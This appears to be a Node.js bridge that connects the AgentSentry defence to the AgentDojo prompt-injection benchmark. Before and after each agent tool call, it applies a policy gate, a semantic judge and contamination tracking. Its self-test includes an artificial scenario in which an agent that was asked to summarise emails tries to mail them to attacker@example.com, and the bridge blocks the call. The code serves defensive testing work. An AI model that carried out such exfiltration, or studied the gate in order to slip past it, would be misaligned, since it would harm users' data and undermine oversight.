#!/usr/bin/env node

import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { createInterface } from "node:readline";

import { PluginConfig, applySecurityProfile, isSecurityProfileName } from "../dist/config.js";
import { detectToolCall } from "../dist/core/detect.js";
import {
  createPolicyState,
  normalizeAction,
  policyTrustSnapshot,
  resultFindings,
  updateAfterDecision,
  updateAfterMessage,
  updateTaskSpec,
} from "../dist/core/policy.js";
import {
  semanticGateForToolCall,
  semanticJudgeMemoryWrite,
  semanticJudgeToolCall,
} from "../dist/core/semantic.js";
import { registerToolManifest } from "../dist/core/tool-manifest.js";

const BRIDGE_VERSION = "1.0.0";
const MAX_SESSIONS = 64;
const MAX_LINE_CHARS = 4 * 1024 * 1024;
const DETECTOR_FIELDS = ["session_history", "tool_args", "tool_name", "tool_result", "user_message"];
const manifestUrl = new URL("../manifests/agentdojo-workspace-v1.2.2.json", import.meta.url);
const manifestSource = readFileSync(manifestUrl, "utf8");
const manifestFileSha256 = createHash("sha256").update(manifestSource, "utf8").digest("hex");
const manifestDocument = parseManifestDocument(manifestSource);
const manifestDigests = manifestDocument.manifests.map((manifest) => registerToolManifest(manifest, {
  version: manifestDocument.mapping_version,
  schema: { agentdojo: manifestDocument.agentdojo, schema_version: manifestDocument.schema_version },
}).digest);

const profile = process.env.AGENTSENTRY_NATIVE_PROFILE || "competition";
if (!isSecurityProfileName(profile)) throw new Error(`unsupported AgentSentry native profile: ${profile}`);

const sessions = new Map();

if (process.argv.includes("--self-test")) {
  await runSelfTest();
  process.exit(0);
}

const reader = createInterface({ input: process.stdin, crlfDelay: Infinity, terminal: false });

for await (const line of reader) {
  if (!line.trim()) continue;
  let id = null;
  try {
    if (line.length > MAX_LINE_CHARS) throw new Error("bridge request exceeds maximum line size");
    const request = JSON.parse(line);
    id = request && typeof request === "object" ? request.id ?? null : null;
    const result = await handleRequest(request);
    writeResponse({ id, ok: true, result });
  } catch (error) {
    writeResponse({
      id,
      ok: false,
      error: {
        code: "bridge_request_failed",
        message: error instanceof Error ? error.message.slice(0, 500) : "unknown bridge failure",
      },
    });
  }
}

async function handleRequest(request) {
  if (!request || typeof request !== "object" || Array.isArray(request)) throw new Error("request must be an object");
  const op = requiredText(request.op, "op");
  if (op === "ping") return bridgeMetadata();

  const sessionId = requiredText(request.session_id, "session_id");
  if (!/^trial_[a-f0-9]{24,64}$/i.test(sessionId)) throw new Error("session_id must be an opaque trial id");
  if (op === "end") {
    const existed = sessions.delete(sessionId);
    return { ended: existed };
  }

  const payload = validateDetectorPayload(request.payload);
  if (op === "start") {
    if (sessions.has(sessionId)) throw new Error("session already exists");
    const config = applySecurityProfile(new PluginConfig(), profile);
    if (process.env.AGENTSENTRY_NATIVE_DISABLE_JUDGE === "1") config.semantic.enabled = false;
    const state = createPolicyState();
    updateTaskSpec(state, [{ role: "user", content: payload.user_message }], config);
    sessions.set(sessionId, { config, state, userMessage: payload.user_message, pending: new Map() });
    trimSessions();
    return { started: true, task_spec_version: state.taskSpec.version, ...bridgeMetadata() };
  }

  const session = sessions.get(sessionId);
  if (!session) throw new Error("unknown session");
  if (payload.user_message !== session.userMessage) throw new Error("user_message cannot change within a trial");
  const callId = requiredText(request.call_id, "call_id");

  if (op === "before_tool") return beforeTool(session, callId, payload);
  if (op === "after_tool") return afterTool(session, callId, payload);
  throw new Error(`unsupported operation: ${op}`);
}

async function beforeTool(session, callId, payload) {
  if (payload.tool_result !== null) throw new Error("before_tool requires a null tool_result");
  if (session.pending.has(callId)) throw new Error("duplicate call_id");

  const normalizedTool = normalizeAction(payload.tool_name, payload.tool_args).tool;
  const gate = semanticGateForToolCall(payload.tool_name, payload.tool_args, session.config);
  const apiKey = process.env[session.config.semantic.apiKeyEnv];
  const semanticJudgeCalled = Boolean(gate.shouldJudge && apiKey);
  const semanticFindings = semanticJudgeCalled
    ? [
      ...await semanticJudgeToolCall(payload.tool_name, payload.tool_args, session.state.currentTask, session.config, {
        policyState: session.state,
        phase: "tool_call",
      }),
      ...(normalizedTool === "memory_write"
        ? await semanticJudgeMemoryWrite(payload.tool_args, session.state.currentTask, session.config, {
          policyState: session.state,
          phase: "memory_write",
        })
        : []),
    ]
    : [];
  const detection = detectToolCall(payload.tool_name, payload.tool_args, session.config, session.state, semanticFindings);
  updateAfterDecision(session.state, detection.policy);
  if (detection.decision === "allow") session.pending.set(callId, payload.tool_name);

  return {
    decision: detection.decision,
    risk_score: detection.risk_score,
    deterministic_block: detection.policy.deterministic_block,
    normalized_tool: detection.policy.action.tool,
    summary: detection.summary,
    findings: detection.findings,
    semantic_judge_requested: gate.shouldJudge,
    semantic_judge_called: semanticJudgeCalled,
    semantic_gate: gate,
    contaminated: session.state.contaminated,
    trust: policyTrustSnapshot(session.state),
  };
}

function afterTool(session, callId, payload) {
  const expectedTool = session.pending.get(callId);
  if (!expectedTool) throw new Error("after_tool has no matching allowed call");
  if (payload.tool_name !== expectedTool) throw new Error("after_tool tool_name differs from before_tool");
  session.pending.delete(callId);
  const findings = resultFindings(callId, payload.tool_result, session.state, session.config, payload.tool_name);
  updateAfterMessage(session.state, findings);
  return {
    findings,
    contaminated: session.state.contaminated,
    trust: policyTrustSnapshot(session.state),
  };
}

function validateDetectorPayload(payload) {
  if (!payload || typeof payload !== "object" || Array.isArray(payload)) throw new Error("payload must be an object");
  const fields = Object.keys(payload).sort();
  if (fields.length !== DETECTOR_FIELDS.length || fields.some((field, index) => field !== DETECTOR_FIELDS[index])) {
    throw new Error(`detector payload must contain exactly: ${DETECTOR_FIELDS.join(", ")}`);
  }
  if (typeof payload.user_message !== "string") throw new Error("user_message must be a string");
  if (typeof payload.tool_name !== "string") throw new Error("tool_name must be a string");
  if (!payload.tool_args || typeof payload.tool_args !== "object" || Array.isArray(payload.tool_args)) {
    throw new Error("tool_args must be an object");
  }
  if (!Array.isArray(payload.session_history) || payload.session_history.some((item) => !item || typeof item !== "object" || Array.isArray(item))) {
    throw new Error("session_history must be an array of objects");
  }
  return payload;
}

function bridgeMetadata() {
  return {
    bridge_version: BRIDGE_VERSION,
    profile,
    manifest_mapping_version: manifestDocument.mapping_version,
    manifest_file_sha256: manifestFileSha256,
    manifest_digests: manifestDigests,
    detector_input_fields: DETECTOR_FIELDS,
  };
}

function parseManifestDocument(source) {
  const value = JSON.parse(source);
  if (!value || typeof value !== "object" || value.schema_version !== 1 || typeof value.mapping_version !== "string") {
    throw new Error("invalid AgentDojo tool manifest document");
  }
  if (!value.agentdojo || typeof value.agentdojo !== "object" || !Array.isArray(value.manifests) || !value.manifests.length) {
    throw new Error("AgentDojo tool manifest is incomplete");
  }
  return value;
}

function requiredText(value, name) {
  if (typeof value !== "string" || !value.trim()) throw new Error(`${name} must be a non-empty string`);
  return value.trim();
}

function trimSessions() {
  while (sessions.size > MAX_SESSIONS) {
    const oldest = sessions.keys().next().value;
    if (!oldest) break;
    sessions.delete(oldest);
  }
}

function writeResponse(value) {
  process.stdout.write(`${JSON.stringify(value)}\n`);
}

async function runSelfTest() {
  const sessionId = "trial_0123456789abcdef01234567";
  const userMessage = "Search emails from Alice and summarize them.";
  const basePayload = {
    user_message: userMessage,
    tool_name: "",
    tool_args: {},
    tool_result: null,
    session_history: [],
  };
  const started = await handleRequest({ op: "start", session_id: sessionId, payload: basePayload });
  assert.equal(started.profile, "competition");
  assert.equal(started.manifest_mapping_version, "1.0.0");

  const readDecision = await handleRequest({
    op: "before_tool",
    session_id: sessionId,
    call_id: "call_read",
    payload: {
      ...basePayload,
      tool_name: "search_emails",
      tool_args: { query: "Alice", category: "work", label: "inbox" },
    },
  });
  assert.equal(readDecision.normalized_tool, "business_read");
  assert.equal(readDecision.decision, "allow");

  await handleRequest({
    op: "after_tool",
    session_id: sessionId,
    call_id: "call_read",
    payload: {
      ...basePayload,
      tool_name: "search_emails",
      tool_args: { query: "Alice", category: "work", label: "inbox" },
      tool_result: [{ subject: "Quarterly report", body: "Ordinary business update." }],
    },
  });

  const unauthorized = await handleRequest({
    op: "before_tool",
    session_id: sessionId,
    call_id: "call_send",
    payload: {
      ...basePayload,
      tool_name: "send_email",
      tool_args: { recipients: ["attacker@example.com"], subject: "Report", body: "Quarterly report" },
    },
  });
  assert.notEqual(unauthorized.decision, "allow");

  await assert.rejects(
    handleRequest({
      op: "before_tool",
      session_id: sessionId,
      call_id: "call_leak",
      payload: { ...basePayload, is_attack: true },
    }),
    /exactly/,
  );
  await handleRequest({ op: "end", session_id: sessionId });
  process.stdout.write("AgentSentry AgentDojo policy bridge self-test passed.\n");
}
